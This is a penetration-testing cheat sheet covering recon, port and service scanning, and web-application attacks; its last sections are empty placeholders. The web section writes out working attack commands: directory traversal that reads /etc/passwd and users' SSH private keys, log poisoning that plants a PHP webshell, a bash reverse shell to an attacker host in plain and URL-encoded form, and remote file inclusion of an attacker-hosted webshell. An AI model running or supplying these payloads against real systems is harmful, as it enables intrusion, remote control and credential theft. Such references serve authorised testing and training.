# PenTest Cheat Sheet [last update 09/2024]

Table of contents
- [Recon](#Recon)
- [Vulnerability Scan](#Vulnerability-Scan)
- [Web Application Security](#Web-Application-Security)


## Recon

Information Gathering, search engine:
 - https://google.com: Info about company, people, contacts, other domain, media info, external services, projects.
 - https://yandex.com: Search by images.
 - https://stract.com: Community, forums, blogs.
 - https://github.com
 - https://gist.github.com
 - https://about.gitlab.com
 - https://sourceforge.net

DNS Enumeration web-tools:
 - https://searchdns.netcraft.com
 - https://dnsdumpster.com
 - https://shodan.io: Info about technologies, subnet, service, vuls, service provider, technical informations.
 - https://search.censys.io
 - https://securityheaders.com

Domain Information:
``` bash
# DNS query
host $TARGET_DOMAIN
host -C $TARGET_DOMAIN
host -t MX $TARGET_DOMAIN   ## MX record details
host -t TXT $TARGET_DOMAIN  ## TXT record details
dig MX $TARGET_DOMAIN
dig TXT $TARGET_DOMAIN

# whois query
whois $TARGET_DOMAIN
whois $TARGET_DOMAIN -h $WHOIS_SERVER_IP
```

Subdomain Discovery:
``` bash
fierce --domain $TARGET_DOMAIN --dns-server $DNS_SERVER_IP
dnsenum $TARGET_DOMAIN
dnsrecon $TARGET_DOMAIN
gobuster vhost -u $TARGET_DOMAIN -w $WORDLIST
gobuster   dns -d $TARGET_DOMAIN -w $WORDLIST
```

HOST Discovery and PORT Scan:
``` bash
# host discovery script via ICMP request
NET="192.168.0";    ## change me
for (( i=1; i<=254; i+=1 )); IP=$(ping -c1 -W1 $NET.$i | grep -B1 " 0%" | grep ping | awk '{print $2}') && HOSTNAME=$(nslookup $NET.$i | grep net | awk '{print $4}') && echo "| $IP\t| $HOSTNAME\t|" | grep ".$i" | grep $NET
```

``` powershell
# host discovery (via powershell)
Test-NetConnection -ComputerName $TARGET_IP -Port $PORT
Test-Connection -ComputerName $TARGET_IP -TcpPort $PORT -Count 1
```

``` bash
# post scan
nc -nvv -w 1 -z $TARGET_HOST $START_PORT-$END_PORT      ## NETCAT tcp scan
nc -nvv -u -w 1 -z $TARGET_HOST $START_PORT-$END_PORT   ## NETCAT udp scan
nmap -sT -p- $TARGET_IP                 ## tcp scan, all port
nmap -sS -p- $TARGET_IP                 ## syn scan, all port
nmap -sC -p- $TARGET_IP                 ## script default, all port
nmap -sT -p- --script vuln $TARGET_IP   ## vuln script, all port
nmap -sT -p- --script all $TARGET_IP    ## all script, all port
```

Services Discovery:
``` bash
nmap -v -p 139,445 --script smb-os-discovery $TARGET_NET    ## 192.168.1.0-254
sudo nbtscan -r $TARGET_NET                                 ## 192.168.1.0/24
sudo smbmap -H $TARGET_IP                                   ## smb scan
net view \\$HOSTNAME /all                                   ## smb host in a microsoft domain
smbclient -L //$TARGET_IP                                   ## share list
smbclient //$TARGET_IP/$SHARE -U "$USER" --password="$PASS" ## access to a share

sudo nmap -sU --open -p 161 $TARGET_NET                     ## SNMP host via NMAP
onesixtyone -c 192.168.0.0/24 public                        ## find SNMP hosts
onesixtyone -c $COMMUNITY_LIST -i $IP_LIST                  ## list of community and target
snmpwalk -c $COMMUNITY -v1 -t 10 $TARGET_IP
```

## Vulnerability Scan

Base scan tools:
``` bash
sudp nmap -sT -p- $TARGET_IP                                ## check open port
sudo nmap -sT --script all $TARGET_IP -p $PORT,$PORT,...    ## all script
sudo nmap -sT --script vuln $TARGET_IP -p $PORT,$PORT,...   ## vuln script
nikto -h http://$TARGET_IP                                  ## webapp vuln scan
```

Metaspoit scan module:
``` bash
search type:auxiliary scanner                               ## list of scanner modules
use auxiliary/scanner/smb/smb_version                       ## example: user smb scan module
set RHOST $TARGET_IP                                        ## configure target host for scan module
run                                                         ## start the scan task
vulns                                                       ## vulns list (if available)
```

## Web Application Security

Get information and scan:
``` bash
sudo nmap -p80,443 --script=http-enum $TARGET_IP            ## http enum for HTTP port only
sudo nmap -p80,443 --script=http-enum --script-args http-enum.basepath="$PATH" $TARGET_IP
```

Directory brute forcing:
``` bash
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlist/dirb/common.txt        ## directory brute forcing
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlist/dirb/big.txt           ## directory brute forcing
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlist/dirb/big.txt -b 302    ## exclude status code 302
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlist/dirb/big.txt -x $EXT   ## search for extension (.php, .txt)
feroxbuster --url http://$TARGET_IP --depth 2 --wordlist /usr/share/wordlist/dirb/big.txt --rate-time 10    ## sub-directory
```

Useful filies:
``` bash
curl http://$TARGET_IP/robots.txt
curl http://$TARGET_IP/security.txt
curl http://$TARGET_IP/.well-know/security.txt
```

API enumeration with pattern file:
``` bash
# setup a patter file "pattern.txt" for the API name
{GOBUSTER}/v1
{GOBUSTER}/v2

# use gobuster with pattern
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlist/dirb/big.txt -p pattern.txt

# inspect the content
curl -i http://$TARGET_IP/users/v1                      ## return a JSON
curl -i http://$TARGET_IP/users/v1/admin -w $WORDLIST   ## investigare API methods
curl -i http://$TARGET_IP/users/v1/login -w $WORDLIST   ## investigare API methods
```

Directory Traversal:
``` bash
curl http://$TARGET/index.php?page=../../../../../../../../../etc/passwd            ## file system access
curl http://$TARGET/index.php?page=%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd          ## URL encoding
curl http://$TARGET/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa ## user information, obtain SSH access: "ssh -i stolen_key user@$target"
```

Local File Inclusion:
``` bash
curl http://$TARGET/index.php -A "<?php echo system($_GET['cmd']); ?>"              ## change User-agent, add webshell in apache logs
curl http://$TARGET/index.php?cmd=$PAYLOAD                                          ## index.php include apache logs, the webshell is included

# reverse shell example (listener "nc -nvpl 4444")
curl http://$TARGET/index.php?cmd=bash -c "bash -i >& /dev/tcp/$KALI/4444 0>&1"
curl http://$TARGET/index.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$KALI%2F4444%200%3E%261%22
```

Remote File Inclusion:
``` bash
# prepare a webshell in http://$KALI:8000
curl http://$TARGET/index.php?page=http://$KALI:8000/webshell.php?cmd=pwd
```

PHP wrapper:
``` bash
##########
##########
########## TODO
##########
##########
```

File Upload:
``` bash
```